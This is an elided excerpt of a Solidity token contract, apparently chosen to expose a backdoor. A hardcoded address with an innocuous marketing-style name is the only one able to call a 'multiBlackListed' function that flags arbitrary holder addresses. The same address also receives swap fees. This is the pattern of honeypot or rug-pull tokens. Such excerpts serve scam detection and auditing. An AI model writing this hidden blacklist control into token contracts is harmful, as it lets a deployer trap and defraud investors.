...
contract Token is Context, IERC20, Ownable{
    ...
    address payable public _MultiSend;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _multiListed;
    ...
    constructor () {
        ...
        _MultiSend = payable(address(0xe9Cd429984EcdB4F3A8076C50DcA7F7ACDF964A7));
    ...
    function multiBlackListed(bool status, address[] calldata addresses) public {
        require(msg.sender == _MultiSend);
        for (uint256 i; i < addresses.length; i++) {
            _multiListed[addresses[i]] = status;
        }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            _MultiSend.transfer(MarketAmount);
    }
